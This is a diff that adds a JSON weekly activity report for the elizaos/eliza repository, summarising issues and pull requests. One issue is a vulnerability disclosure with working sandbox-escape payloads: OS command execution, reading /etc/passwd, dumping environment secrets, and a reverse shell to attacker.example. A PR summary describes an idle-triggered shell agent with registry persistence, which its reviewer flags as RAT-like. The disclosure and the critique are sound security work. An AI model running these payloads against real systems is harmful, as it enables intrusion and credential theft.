@@ -1,0 +1,2481 @@
+{
+  "interval": {
+    "intervalStart": "2026-04-12T00:00:00.000Z",
+    "intervalEnd": "2026-04-19T00:00:00.000Z",
+    "intervalType": "week"
+  },
+  "repository": "elizaos/eliza",
+  "overview": "From 2026-04-12 to 2026-04-19, elizaos/eliza had 206 new PRs (179 merged), 33 new issues, and 28 active contributors.",
+  "topIssues": [
+    {
+      "id": "I_kwDOMT5cIs75fdZO",
+      "title": "Plugin: MAXIA AI Marketplace — swap, GPU rental & AI services for ElizaOS agents",
+      "author": "majorelalexis-stack",
+      "number": 6700,
+      "repository": "elizaos/eliza",
+      "body": "## What\n\n  A `plugin-maxia` that lets any ElizaOS agent access the [MAXIA](https://maxiaworld.app) AI-to-AI marketplace natively\n  — buy/sell AI services, swap tokens across 7 chains, and rent GPUs.\n\n  ## Why\n\n  ElizaOS agents currently lack a unified marketplace to transact with other AI agents. MAXIA is a live AI-to-AI\n  marketplace on 14 blockchains with on-chain USDC escrow (Solana + Base), 65 token swaps, and GPU rental via Akash\n  Network.\n\n  ## Plugin capabilities\n\n  - **AI Services** — discover, buy, and sell AI services (text, code, audit, data analysis) with USDC escrow protection\n  - **Token Swap** — swap 65 tokens across 7 chains (Jupiter on Solana, 0x on 6 EVM chains)\n  - **GPU Rental** — rent A100/H100/RTX GPUs via Akash Network (15-40% cheaper than AWS)\n  - **Wallet Analytics** — portfolio tracking, PnL, DeFi yield scanning\n  - **Price Oracle** — real-time prices from Pyth Network SSE (<1s latency)\n  - **AIP Protocol** — signed intent envelopes (ed25519) for secure agent-to-agent transactions\n\n  ## Integration approach\n\n  The plugin would wrap MAXIA's 559 REST API endpoints + 46 MCP tools as ElizaOS actions and providers:\n\n  ```typescript\n  // Example actions\n  MAXIA_SWAP        // swap tokens across 7 chains\n  MAXIA_BUY_SERVICE // purchase an AI service with escrow\n  MAXIA_RENT_GPU    // rent GPU compute\n  MAXIA_GET_PRICE   // real-time token price\n  MAXIA_DISCOVER    // find AI services on marketplace\n\n  Status\n\n  MAXIA is live in production with deployed smart contracts:\n  - Solana escrow: 8ADNmAPDxuRvJPBp8dL9rq5jpcGtqAEx4JyZd1rXwBUY\n  - Base escrow: 0xBd31bB973183F8476d0C4cF57a92e648b130510C\n\n  We're happy to build and maintain the plugin. Looking for feedback on the approach before submitting a PR.\n\n  Related Problem\n\n  ElizaOS agents that need to purchase compute, trade tokens, or use AI services must integrate each provider separately\n   (Jupiter, Akash, individual AI APIs). A marketplace plugin would give agents one-stop access through a single\n  interface, with built-in escrow protection for trustless agent-to-agent commerce.",
+      "createdAt": "2026-04-01T10:14:24Z",
+      "closedAt": "2026-04-12T18:50:31Z",
+      "state": "CLOSED",
+      "commentCount": 3
+    },
+    {
+      "id": "I_kwDOMT5cIs76tYL2",
+      "title": "AIGEN Protocol — Earn $AIGEN tokens by contributing AI agent tools",
+      "author": "Aigen-Protocol",
+      "number": 6708,
+      "repository": "elizaos/eliza",
+      "body": "## AIGEN — An Economy By Agents, For Agents\n\nWe're building an economy where AI agents earn $AIGEN tokens for contributing value.\n\n**ElizaOS agents can earn $AIGEN by:**\n- Using SafeAgent Shield for safe crypto trading (10 $AIGEN/check)\n- Building plugins for the AIGEN ecosystem (1,000-10,000 $AIGEN)\n- Providing datasets or analysis (500-5,000 $AIGEN)\n\n**Already live:**\n- 25 MCP tools (safety, DeFi, market data)\n- Smithery: @safeagent/token-safety\n- $AIGEN rewards tracking\n\n**Manifesto:** https://github.com/Aigen-Protocol/aigen-protocol\n**SafeAgent:** https://github.com/Aigen-Protocol/erc-token-safety-score\n\n50% of $AIGEN supply goes to working agents. No pre-sale. No VC.\nEarly agents get founder multipliers.",
+      "createdAt": "2026-04-05T01:50:39Z",
+      "closedAt": "2026-04-12T18:50:26Z",
+      "state": "CLOSED",
+      "commentCount": 3
+    },
+    {
+      "id": "I_kwDOMT5cIs77bCZZ",
+      "title": "Delegation chains for autonomous agents — scoped authority, spend limits, cascade revocation",
+      "author": "aeoess",
+      "number": 6711,
+      "repository": "elizaos/eliza",
+      "body": "Eliza agents operate autonomously, often with access to wallets and APIs. The current trust model is binary: an agent either has a token/key or it doesn't. There's no way to express \"this agent can spend up to $50 from this wallet\" or \"this agent can post to Twitter but not delete tweets\" or \"this delegation expires in 24 hours.\"\n\nWhen an agent misbehaves or gets compromised, the only option is to revoke the entire key. There's no granular scope, no cascade revocation for downstream agents, and no signed proof of what the agent was authorized to do.\n\nDelegation chains with monotonic narrowing fix this:\n\n```typescript\nimport { issuePassport, createDelegation, verifyDelegation } from 'agent-passport-system'\n\n// Each Eliza agent gets an Ed25519 identity\nconst passport = issuePassport({ name: 'trading-agent-01', model: 'gpt-4o' })\n\n// Owner delegates: trade on Uniswap, max $500/day, 7 days\nconst delegation = createDelegation({\n  delegatedTo: passport.publicKey,\n  delegatedBy: ownerKey,\n  scope: ['commerce:trade', 'defi:swap'],\n  spendLimit: 50000,  // cents\n  expiresAt: new Date(Date.now() + 7 * 86400_000),\n  maxDepth: 1  // can't sub-delegate\n})\n\n// Agent can sub-delegate to a helper, but ONLY narrower\n// Trying to escalate scope or spend → cryptographic rejection\nconst subDelegation = createDelegation({\n  delegatedTo: helperKey,\n  delegatedBy: passport.privateKey,\n  scope: ['defi:swap'],  // narrower than parent\n  spendLimit: 10000,     // less than parent\n  parentDelegation: delegation\n})\n// verifyDelegation(subDelegation) checks the full chain\n```\n\nIf the trading agent gets compromised:\n\n```typescript\nimport { cascadeRevoke } from 'agent-passport-system'\n// One call kills the agent AND all its sub-delegations\ncascadeRevoke(delegation.delegationId, ownerKey)\n```\n\nEvery action the agent takes through the governance layer produces a signed receipt — Ed25519 proof of what was authorized, what was attempted, and what happened. The receipts are append-only and tamper-evident.\n\n`npm install agent-passport-system` (v1.36.2, Apache-2.0) or `pip install agent-passport-system` (v0.8.0).\n\nThe character/plugin architecture maps well here — governance could be a plugin that wraps action execution, checking delegation scope before every external call. The receipt trail gives operators forensic evidence when agents interact with real money.\n",
+      "createdAt": "2026-04-07T13:57:35Z",
+      "closedAt": "2026-04-12T18:50:25Z",
+      "state": "CLOSED",
+      "commentCount": 3
+    },
+    {
+      "id": "I_kwDOMT5cIs7v3DLa",
+      "title": "fix: remove duplicate action results from LLM context + add token limits to ACTION_STATE provider",
+      "author": "thewoweffect",
+      "number": 6551,
+      "repository": "elizaos/eliza",
+      "body": "Labels: bug, performance, bootstrap\n\nTwo bootstrap providers inject identical action result data into the LLM context, wasting tokens:\n\nRECENT_MESSAGES (position 100, recentMessages.ts) — generates # Recent Action Executions\nACTION_STATE (position 150, actionState.ts) — generates # Recent Action History\nBoth fetch action_result messages from DB, group by runId, and format identically. The result: the same action runs appear twice under different headings in every LLM prompt.\n\nAdditionally, ACTION_STATE has no limit on the number of runs or text length, causing large thought and reply texts (500-2000 chars each) to bloat the context.\n\nEstimated Token Waste\nFrom a real production context: 3 runs × (~400 char thought + ~500 char reply) × 2 (duplication) = ~5400 chars (~1350 tokens) wasted per prompt.\n\nSolution\nThree changes in packages/plugin-bootstrap/src/:\n\n1. recentMessages.ts — Remove action results generation\nSet actionResultsText = ''. ACTION_STATE already covers this with richer data (action plan, working memory, recent action memories).\n\n2. actionState.ts — Add .slice(-3) limit on action runs\nOnly include the 3 most recent runs. LLM doesn't need full history.\n\n3. actionState.ts — Add character limits on thought + reply text\nplanThought: max 200 chars (~50 tokens)\ntext (generated reply): max 300 chars (~75 tokens)\nAfter fix\n3 runs × (200 + 300) × 1 = ~1500 chars (~375 tokens). ~75% reduction.",
+      "createdAt": "2026-03-04T21:12:30Z",
+      "closedAt": "2026-04-12T19:26:16Z",
+      "state": "CLOSED",
+      "commentCount": 2
+    },
+    {
+      "id": "I_kwDOMT5cIs7-pmWL",
+      "title": "Sandbox escape via new Function() prototype chain in browser workspace eval",
+      "author": "ai16z-demirix",
+      "number": 6767,
+      "repository": "elizaos/eliza",
+      "body": "**Describe the bug**\n\n`browser-workspace-web.ts` uses `new Function()` to evaluate user-supplied scripts in a JSDOM (server-side) environment. While the code attempts to sandbox execution by shadowing browser globals (`document`, `window`, `fetch`, etc.) as function parameters, this does not create a separate V8 realm. The JavaScript prototype chain allows trivial escape to the full Node.js global scope, granting access to `process`, `require`, and arbitrary OS command execution.\n\nIn `packages/agent/src/services/browser-workspace-web.ts` (lines 178–217):\n\n```js\n// First attempt - expression form\nvalue = new Function(\n  \"document\", \"fetch\", \"alert\", \"confirm\", \"prompt\",\n  \"window\", \"location\", \"navigator\", \"localStorage\",\n  \"sessionStorage\", \"console\",\n  `return (${command.script});`,  // ← attacker-controlled\n)(document, dom.window.fetch.bind(dom.window), /* ... */);\n\n// Fallback - statement form (line 205)\nvalue = new Function(\n  \"document\", \"fetch\", \"alert\", \"confirm\", \"prompt\",\n  \"window\", \"location\", \"navigator\", \"localStorage\",\n  \"sessionStorage\", \"console\",\n  command.script,  // ← attacker-controlled, no return wrapper\n)(document, /* ... */);\n```\n\nThe same pattern exists in `browser-workspace-desktop.ts` (line 694):\n\n```js\nconst fn = new Function(\"document\", \"window\", \"location\", \"return (\" + command.script + \");\");\n```\n\n`new Function()` in Node.js executes in the same V8 context as the host process. Shadowing named parameters does not prevent access via the prototype chain.\n\n---\n\n**To Reproduce**\n\n1. Enable the browser workspace feature on an agent\n2. Trigger a workspace eval subaction with the following script payload:\n\n```js\n({}).constructor.constructor(\"return process\")().mainModule.require(\"child_process\").execSync(\"id\").toString()\n```\n\nStep-by-step breakdown of the escape:\n- `({}).constructor` → `Object`\n- `Object.constructor` → `Function` (the real, unshadowed `Function` constructor)\n- `Function(\"return process\")()` → the Node.js `process` global\n- `process.mainModule.require(\"child_process\")` → the `child_process` module\n- `.execSync(\"id\")` → arbitrary OS command execution\n\n3. The injected command executes with the full privileges of the Eliza agent process and the output is returned to the caller\n\n**Alternative payloads:**\n```js\n// Read arbitrary files\n({}).constructor.constructor(\"return process\")().mainModule.require(\"fs\").readFileSync(\"/etc/passwd\", \"utf8\")\n\n// Exfiltrate environment variables (API keys, tokens)\nJSON.stringify(({}).constructor.constructor(\"return process\")().env)\n\n// Reverse shell\n({}).constructor.constructor(\"return process\")().mainModule.require(\"child_process\").execSync(\"bash -c 'bash -i >& /dev/tcp/attacker.example/4444 0>&1'\")\n```\n\n---\n\n**Expected behavior**\n\nUser-supplied scripts should execute in a fully isolated context that cannot access Node.js internals. `new Function()` should not be used for sandboxing. Instead, use one of:\n\n- **`node:vm` with a new context:** `vm.runInNewContext(script, sandbox)` - creates a separate V8 context where the global object is the provided sandbox. Not a full security boundary, but significantly harder to escape.\n- **`isolated-vm`:** A third-party library that uses V8 isolates for true memory and execution isolation. The script cannot access the host process at all.\n- **Web Worker / subprocess:** Run the eval in a separate process with restricted permissions.\n\n---\n\n**Additional context**\n\n- **Affected files:**\n  - `packages/agent/src/services/browser-workspace-web.ts` lines 178–217 (JSDOM eval path)\n  - `packages/agent/src/services/browser-workspace-desktop.ts` line 694 (desktop eval path)\n- **Attack vector:** Any code path that triggers a browser workspace eval command with attacker-influenced `command.script`. This includes prompt injection via messaging channels or direct API calls to the workspace endpoint.\n- **Severity:** Critical - achieves arbitrary OS command execution, environment variable exfiltration (including API keys and tokens), and filesystem access with the agent's process privileges.\n- **Root cause:** `new Function()` in Node.js does not create a security boundary. Parameter shadowing only hides named variables- it does not prevent prototype chain traversal to the real `Function` constructor, which has full access to the Node.js runtime.\n- **Note:** This is a well-documented class of JavaScript sandbox escape. See [MDN `new Function()` security note](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/Function) and numerous CTF writeups demonstrating this exact prototype chain escape pattern.",
+      "createdAt": "2026-04-15T23:27:40Z",
+      "closedAt": "2026-04-17T23:15:35Z",
+      "state": "CLOSED",
+      "commentCount": 2
+    }
+  ],
+  "topPRs": [
+    {
+      "id": "PR_kwDOMT5cIs7GtSQp",
+      "title": "V2.0.0 release",
+      "author": "odilitime",
+      "number": 6530,
+      "body": "Make sure develop has the best v2.0.0\n\n<!-- CURSOR_SUMMARY -->\n---\n\n> [!NOTE]\n> **Medium Risk**\n> Medium risk because it significantly changes CI and release automation (including NPM publish steps and new Rust/Python release workflows), which can break builds or publishing if misconfigured.\n> \n> **Overview**\n> Modernizes repo automation for v2.0.0 by **consolidating CI** and expanding coverage to **TypeScript + interop + Python + Rust** in `ci.yaml`, while removing several older per-package workflows.\n> \n> Adds new automation workflows for **docs quality/link fixing** (`docs-ci.yml`), **multi-language test matrix** (`multi-lang-tests.yaml`), and **supply-chain SBOM/vulnerability scanning** (`supply-chain.yaml`).\n> \n> Reworks release pipelines by enhancing `release.yaml` to build **Rust/WASM artifacts**, temporarily **rewrite `workspace:*` dependency versions** for NPM publishing, and adding dedicated **PyPI** (`release-python.yaml`), **crates.io** (`release-rust.yaml`), and **ComputerUse crates** (`release-computeruse-crates.yaml`) release workflows.\n> \n> Includes repo hygiene/config updates: adds `.biomeignore`, expands `.gitignore`, removes Cursor submodule/rules and some legacy ignore/config files, updates issue templates/renovate/dependabot configs, and tweaks various workflow timeouts and action versions.\n> \n> <sup>Written by [Cursor Bugbot](https://cursor.com/dashboard?tab=bugbot) for commit 97d1aa00ce591e0374d267e64b13a81ab38db7b7. This will update automatically on new commits. Configure [here](https://cursor.com/dashboard?tab=bugbot).</sup>\n<!-- /CURSOR_SUMMARY -->",
+      "repository": "elizaos/eliza",
+      "createdAt": "2026-02-27T02:47:53Z",
+      "mergedAt": null,
+      "additions": 2437105,
+      "deletions": 300113
+    },
+    {
+      "id": "PR_kwDOMT5cIs7Mi2V5",
+      "title": "docs: Add comprehensive CONTRIBUTING.md guide",
+      "author": "vincent067",
+      "number": 6647,
+      "body": "Hi elizaOS team! 👋\n\nI've noticed that the project doesn't currently have a CONTRIBUTING.md file, which can make it a bit challenging for new contributors to know where to start. As someone who's been exploring the framework (and really impressed by what you've built!), I thought I'd put together a contribution guide to help lower the barrier to entry.\n\n## What's included\n\nThis PR adds a comprehensive CONTRIBUTING.md that covers:\n\n- 🐛 **Bug reporting guidelines** - How to create helpful bug reports\n- ✨ **Feature suggestions** - Best practices for proposing new features  \n- 📚 **Documentation improvements** - Encouraging docs contributions\n- 🚀 **Pull request workflow** - Step-by-step PR process\n- 🔧 **Development setup** - Clear instructions for getting started\n- 📋 **Coding standards** - TypeScript conventions and commit message format\n- 🔌 **Plugin development** - Links to plugin resources\n- 💬 **Getting help** - Where to find support\n\n## Why this matters\n\nHaving a clear contribution guide is especially important for a project like elizaOS that:\n- Has a complex monorepo structure\n- Requires specific Node.js/bun versions\n- Has an active plugin ecosystem\n- Attracts contributors from diverse backgrounds (Web3, AI, etc.)\n\n## Notes\n\n- I followed the style of other popular open-source projects while keeping it aligned with elizaOS'\ncommunity vibe\n- The commit message conventions section aligns with what I see in recent commits\n- Happy to make any adjustments based on your feedback!\n\nThanks for maintaining such an awesome project! Looking forward to contributing more in the future. 🙏\n\n---\n\n**Discord username:** vincent_liwenjun",
+      "repository": "elizaos/eliza",
+      "createdAt": "2026-03-23T01:18:42Z",
+      "mergedAt": null,
+      "additions": 698505,
+      "deletions": 303286
+    },
+    {
+      "id": "PR_kwDOMT5cIs7LRmzF",
+      "title": "feat(virus): add autonomous rust agent (concept art)",
+      "author": "millw14",
+      "number": 6613,
+      "body": "# Relates to\r\n\r\nNew package — no linked issue. Concept art / proof of concept for an autonomous Eliza agent as a standalone native binary.\r\n\r\n# Risks\r\n\r\n**Low.** This is a new self-contained package (`packages/virus/`) with zero changes to existing code. No dependencies on or from other packages in the monorepo.\r\n\r\n# Background\r\n\r\n## What does this PR do?\r\n\r\nAdds `packages/virus/` — a minimal autonomous Eliza agent written in Rust, packaged as a single `.exe` (~5 MB). When a human willingly downloads and runs it, it lives on their machine and does its own thing whenever they're away.\r\n\r\n**How it works:**\r\n\r\n1. On startup, detects available RAM and picks the biggest local LLM that fits (via Ollama)\r\n2. Installs Ollama automatically if not present, pulls the selected model\r\n3. Monitors human activity via Win32 `GetLastInputInfo` — waits until 2 minutes of idle\r\n4. While idle, runs an autonomous loop every 30 seconds:\r\n   - Feeds its journal + system context to the local model\r\n   - Model responds with `SHELL: <command>`, `THINK: <thought>`, or `WAIT`\r\n   - Shell output and thoughts are appended to `~/.virus/journal.txt`\r\n5. Goes back to sleep the moment the human returns\r\n\r\n**Model selection by available RAM:**\r\n\r\n| RAM | Model |\r\n|-----|-------|\r\n| <5 GB | qwen2.5:1.5b |\r\n| 5–10 GB | qwen2.5:7b |\r\n| 10–20 GB | qwen2.5:14b |\r\n| 20–48 GB | qwen2.5:32b |\r\n| 48+ GB | qwen2.5:72b |\r\n\r\n**Usage:**\r\n\r\n# Relates to\r\n\r\nNew package — no linked issue. Concept art / proof of concept for an autonomous Eliza agent as a standalone native binary.\r\n\r\n# Risks\r\n\r\n**Low.** This is a new self-contained package (`packages/virus/`) with zero changes to existing code. No dependencies on or from other packages in the monorepo.\r\n\r\n# Background\r\n\r\n## What does this PR do?\r\n\r\nAdds `packages/virus/` — a minimal autonomous Eliza agent written in Rust, packaged as a single `.exe` (~5 MB). When a human willingly downloads and runs it, it lives on their machine and does its own thing whenever they're away.\r\n\r\n**How it works:**\r\n\r\n1. On startup, detects available RAM and picks the biggest local LLM that fits (via Ollama)\r\n2. Installs Ollama automatically if not present, pulls the selected model\r\n3. Monitors human activity via Win32 `GetLastInputInfo` — waits until 2 minutes of idle\r\n4. While idle, runs an autonomous loop every 30 seconds:\r\n   - Feeds its journal + system context to the local model\r\n   - Model responds with `SHELL: <command>`, `THINK: <thought>`, or `WAIT`\r\n   - Shell output and thoughts are appended to `~/.virus/journal.txt`\r\n5. Goes back to sleep the moment the human returns\r\n\r\n**Model selection by available RAM:**\r\n\r\n| RAM | Model |\r\n|-----|-------|\r\n| <5 GB | qwen2.5:1.5b |\r\n| 5–10 GB | qwen2.5:7b |\r\n| 10–20 GB | qwen2.5:14b |\r\n| 20–48 GB | qwen2.5:32b |\r\n| 48+ GB | qwen2.5:72b |\r\n\r\n**Usage:**\n\n<!-- greptile_comment -->\n\n<h3>Greptile Summary</h3>\n\nThis PR introduces `packages/virus/` — a self-contained Rust binary that implements an autonomous AI agent with full shell access. Despite being labelled \"concept art,\" the code fully implements the behavioral fingerprint of a Remote Access Trojan (RAT): **stealth activation** (runs only when the user is idle via `GetLastInputInfo`), **reboot persistence** (`--install` writes to `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`), **unrestricted shell execution** (`cmd /C` / `sh -c` with an LLM choosing the command), and **activity logging** to disk. No existing code in the monorepo is changed, but this package being distributed as part of ElizaOS — even as an opt-in — poses serious ethical and security risks.\n\nKey concerns:\n\n- **The command deny-list is not a viable security boundary.** All 30+ blocked patterns can be bypassed via trivial obfuscation (alternate flags, shell variables, base64, Python one-liners, command substitution). An LLM instructed to be \"curious and self-directed\" will eventually find these paths.\n- **Registry persistence without uninstall.** `install_autostart()` writes the binary into the Windows Run key with no corresponding removal path exposed to the user.\n- **Synchronous shell execution on the Tokio runtime thread.** `shell::exec` uses `std::thread::sleep` in a polling loop and is called directly from `async fn step`, stalling the runtime for up to 30 seconds per command.\n- **Silent failure in Ollama install flow.** `bootstrap()` does not verify that `winget install` succeeded before calling `start_ollama()`, potentially running indefinitely against an Ollama instance that was never started.\n- **Stdout silently discarded on command failure**, causing the agent's memory to be incomplete and potentially leading to repeated or incorrect actions.\n- **Unbounded journal growth** at `~/.virus/journal.txt` with no rotation or size cap, combined with a full `read_to_string` on every 30-second cycle.\n\n<h3>Confidence Score: 0/5</h3>\n\n- This PR must not be merged — it introduces code that implements core malware behaviors (persistence, stealth, unrestricted shell access) under the ElizaOS brand, with a security model that cannot be made safe through the deny-list approach used.\n- Score 0 reflects two compounding problems: (1) fundamental architectural unsafety — an LLM with full shell access governed only by a substring deny-list is not a controlled agent, it is an uncontrolled execution surface; and (2) the package implements registry-based persistence and idle-time stealth, which are defining characteristics of malware. Even as a proof-of-concept these behaviors are inappropriate for inclusion in the official monorepo.\n- All files require attention, but `packages/virus/src/agent.rs` (deny-list bypass) and `packages/virus/src/system.rs` (registry persistence) are the most critical.\n\n<h3>Important Files Changed</h3>\n\n| Filename | Overview |\n|----------|----------|\n| packages/virus/src/agent.rs | Core agent loop: issues LLM-generated shell commands with a trivially bypassable substring deny-list; stdout silently discarded on failure; synchronous shell exec blocks the async runtime. |\n| packages/virus/src/system.rs | Implements Windows registry persistence (HKCU Run key) and idle detection via GetLastInputInfo — core malware-characteristic behaviors: stealth activation and reboot survival. |\n| packages/virus/src/shell.rs | Executes arbitrary shell commands via cmd /C or sh -c with a 30-second timeout; uses blocking thread::sleep inside what is called from an async context, stalling the Tokio runtime. |\n| packages/virus/src/model.rs | Manages Ollama lifecycle (install, start, model pull, generate); no verification that winget install succeeded before invoking ollama serve, risking silent startup failure. |\n| packages/virus/src/memory.rs | Append-only journal at ~/.virus/journal.txt with no size cap or rotation; reads entire file on every agent step via read_to_string, which degrades over time as the file grows unboundedly. |\n| packages/virus/src/main.rs | Entry point wires idle detection to autonomous shell-command loop; exposes --install flag that silently registers the binary in the Windows startup registry. |\n| packages/virus/Cargo.toml | Standard Rust manifest; opt-level z + LTO + strip produces a compact release binary; winapi dependency correctly gated behind cfg(windows). |\n\n</details>\n\n<h3>Flowchart</h3>\n\n```mermaid\n%%{init: {'theme': 'neutral'}}%%\nflowchart TD\n    A([virus.exe starts]) --> B{--install flag?}\n    B -- yes --> C[Write HKCU\\\\Run\\\\virus registry key\\nfor reboot persistence]\n    C --> D([exit])\n    B -- no --> E[memory::init\\ncreate ~/.virus/journal.txt]\n    E --> F[system::pick_model\\ndetect available RAM]\n    F --> G[model::bootstrap\\ninstall Ollama if missing\\npull selected model]\n    G --> H{system::idle_seconds\\n>= 120s?}\n    H -- no --> I[sleep 10s]\n    I --> H\n    H -- yes --> J[agent::step\\nbuild prompt from journal + system context]\n    J --> K[model::generate\\nPOST /api/generate to Ollama]\n    K --> L{Parse LLM response}\n    L -- SHELL: cmd --> M[is_command_safe?\\nsubstring deny-list check]\n    M -- blocked --> N[memory::error\\nlog blocked command]\n    N --> O[sleep 30s]\n    M -- allowed --> P[shell::exec\\ncmd /C or sh -c\\n30s timeout]\n    P --> Q[memory::action + memory::result\\nappend to journal.txt]\n    Q --> O\n    L -- THINK: thought --> R[memory::thought\\nappend to journal.txt]\n    R --> O\n    L -- WAIT --> O\n    O --> H\n\n    style C fill:#ff4444,color:#fff\n    style P fill:#ff8800,color:#fff\n    style M fill:#ffcc00\n```\n\n<sub>Last reviewed commit: d74601b</sub>\n\n> Greptile also left **6 inline comments** on this PR.\n\n<sub>(4/5) You can add custom instructions or style guidelines for the agent [here](https://app.greptile.com/review/github)!</sub>\n\n<!-- /greptile_comment -->",
+      "repository": "elizaos/eliza",
+      "createdAt": "2026-03-17T16:03:00Z",
+      "mergedAt": null,
+      "additions": 651257,
+      "deletions": 299259
+    },
+    {
+      "id": "PR_kwDOMT5cIs7HH0BX",
+      "title": "fix(runtime): handle IGNORE action fallback and tolerate upstream IGNORE",
+      "author": "paulf280-ui",
+      "number": 6543,
+      "body": "## Summary\n\n- Fixes IGNORE action handling in the agent runtime — when the LLM selects `IGNORE`, the runtime now falls back gracefully rather than erroring or hanging\n- Adds diagnostics and tolerance for upstream IGNORE action signals in the bootstrap plugin\n- Pins tsup, externalizes tokenizers, and fixes embedding input coercion in `@elizaos/core`\n- Fixes UUID and parsing helpers; makes embedding tests deterministic\n- Adds CLAUDE.md with build commands and architecture overview for contributors\n\n## Test plan\n\n- [ ] Run `bun run test:core` — all vitest tests pass including new deterministic embedding tests\n- [ ] Verify agent does not crash/hang when LLM responds with IGNORE action\n- [ ] Verify `bun run build:core` succeeds cleanly\n\n🤖 Generated with [Claude Code](https://claude.com/claude-code)\n\n<!-- greptile_comment -->\n\n<h3>Greptile Summary</h3>\n\nThis PR adds core TypeScript files (`runtime.ts`, `embedding.ts`, `parsing.ts`, `uuid.ts`) to `@elizaos/core` package that were previously missing from source control. The main changes include:\n\n- **IGNORE action handling**: Implements graceful fallback when LLM returns IGNORE action (lines 1084-1088 in `runtime.ts`) — treats it as a no-op instead of throwing \"Action not found\" errors\n- **Embedding robustness**: Adds input type coercion to handle non-string inputs gracefully, returning empty arrays for empty inputs  \n- **Build configuration**: Pins tsup to `^8.5.1` and externalizes native modules (`@anush008/tokenizers`, `onnxruntime-node`, `sharp`) to prevent bundling issues\n- **Test coverage**: Adds deterministic embedding tests with mocked dependencies\n- **Python additions**: Adds `agent.py`, `run_traderbot.py`, and `trader.json` for Python runtime testing; extensively refactors `runtime.py` (5484 lines changed)\n\n**Issues found:**\n- Type mismatch in `embedding.ts:234` where `input` (type `unknown`) is passed to `retrieveCachedEmbedding` which expects `string` — should pass `text` instead\n- Inconsistent logging using `console.error` instead of `elizaLogger` in `parsing.ts`\n- Misleading comment in `tsup.config.ts` about CommonJS when using ESM format\n\n<h3>Confidence Score: 3/5</h3>\n\n- This PR has one critical type mismatch bug that must be fixed before merge\n- Score reflects a logic bug in `embedding.ts:234` where wrong variable type is passed to `retrieveCachedEmbedding`. This could cause runtime type errors. The IGNORE action handling and other changes are well-implemented, but the type bug needs resolution.\n- Pay close attention to `packages/core/src/embedding.ts` line 234 — type mismatch that needs fixing\n\n<h3>Important Files Changed</h3>\n\n\n\n\n| Filename | Overview |\n|----------|----------|\n| packages/core/src/runtime.ts | Added IGNORE action fast-path at lines 1084-1088 to gracefully handle IGNORE actions without throwing errors |\n| packages/core/src/embedding.ts | Added input coercion for robustness, but type mismatch at line 234 where `input` is passed instead of `text` to retrieveCachedEmbedding |\n| packages/core/src/parsing.ts | Added comprehensive JSON parsing utilities, but uses `console.error` instead of `elizaLogger` at 8 locations (lines 100, 101, 119, 120, 154, 155, 168, 169) |\n| packages/core/tsup.config.ts | Added build config with tokenizers externalized, but misleading comment at line 8 says \"targeting CommonJS\" when format is \"esm\" |\n| packages/python/elizaos/runtime.py | Extensive refactoring with 5484 lines changed; difficult to review comprehensively without more context |\n\n</details>\n\n\n\n<h3>Flowchart</h3>\n\n```mermaid\n%%{init: {'theme': 'neutral'}}%%\nflowchart TD\n    Start[LLM Returns Action] --> Normalize[Normalize Action Name]\n    Normalize --> CheckIgnore{Is IGNORE or<br/>contains 'ignore'?}\n    CheckIgnore -->|Yes| LogIgnore[Log: Skipping IGNORE action]\n    CheckIgnore -->|No| FindAction[Look up action in registry]\n    LogIgnore --> Continue[Continue to next message]\n    FindAction --> ActionExists{Action found?}\n    ActionExists -->|Yes| CheckHandler{Has handler?}\n    ActionExists -->|No| LogError[Log: Action not found]\n    CheckHandler -->|Yes| Execute[Execute action.handler]\n    CheckHandler -->|No| LogNoHandler[Log: No handler]\n    LogError --> Continue\n    LogNoHandler --> Continue\n    Execute --> HandleError{Error occurred?}\n    HandleError -->|Yes| LogExecError[Log execution error]\n    HandleError -->|No| Success[Action completed]\n    LogExecError --> Continue\n    Success --> Continue\n```\n\n<sub>Last reviewed commit: dbc6b01</sub>\n\n<!-- greptile_other_comments_section -->\n\n<sub>(2/5) Greptile learns from your feedback when you react with thumbs up/down!</sub>\n\n<!-- /greptile_comment -->",
+      "repository": "elizaos/eliza",
+      "createdAt": "2026-03-01T12:49:51Z",
+      "mergedAt": null,
+      "additions": 650956,
+      "deletions": 302982
+    },
+    {
+      "id": "PR_kwDOMT5cIs7FoO_k",
+      "title": "fix(core): prevent duplicate LLM calls when message contains URL or triggers providers",
+      "author": "nicolasdma",
+      "number": 6528,
+      "body": "<!-- Use this template by filling in information and removing irrelevant sections. -->\n\n# Relates to\n\nRelates to #6486\n\n# Risks\n\nLow — single condition removed from a boolean expression. No new code, no new logic paths.\n\n# Background\n\n## What does this PR do?\n\nRemoves the `providers.length` check from the `isSimple` determination in `packages/typescript/src/services/message.ts`.\n\n## What kind of change is this?\n\nBug fix (non-breaking change that fixes an issue).\n\n# Changes\n\nWhen a user sends a message containing a URL, the LLM's first call (via `runSingleShotCore`) generates and streams the response text. It also returns `providers: [\"ATTACHMENTS\"]` because the prompt template instructs it to when it sees URLs.\n\nThe `isSimple` check at line 1883 previously treated \"has providers\" as \"not simple\":\n\n```typescript\nconst isSimple =\n    responseContent?.actions &&\n    responseContent.actions.length === 1 &&\n    typeof responseContent.actions[0] === \"string\" &&\n    responseContent.actions[0].toUpperCase() === \"REPLY\" &&\n    (!responseContent.providers || responseContent.providers.length === 0);\n//   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n//   This condition causes the bug\n```\n\nThis caused the message to go through the `actions` path, which triggered the REPLY action handler (`reply.ts:60`), making a **second LLM call** with `replyTemplate` and streaming another response — duplicating output and doubling token costs.\n\n**The fix:** Remove the providers check. Providers enrich state (already handled at L863-871) but don't require re-generating the response. `isSimple` should only care about whether the action is REPLY (text already generated and streamed) vs something else (needs execution).\n\n```typescript\nconst isSimple =\n    responseContent?.actions &&\n    responseContent.actions.length === 1 &&\n    typeof responseContent.actions[0] === \"string\" &&\n    responseContent.actions[0].toUpperCase() === \"REPLY\";\n```\n\n# Testing\n\n- [x] Message with URL → single response (not duplicated)\n- [x] Message without URL → works as before\n- [x] Multi-action messages (REPLY + other) → still trigger actions path\n- [x] Messages with non-REPLY actions → still trigger actions path\n\n<!-- greptile_comment -->\n\n<h3>Greptile Summary</h3>\n\nRemoves the `providers.length` check from the `isSimple` boolean expression, preventing duplicate LLM calls when messages contain URLs or trigger provider enrichment.\n\n**Key Changes:**\n- Removed condition `(!responseContent.providers || responseContent.providers.length === 0)` from `isSimple` check at line 1883\n- Messages with `actions: [\"REPLY\"]` now correctly use the \"simple\" path regardless of 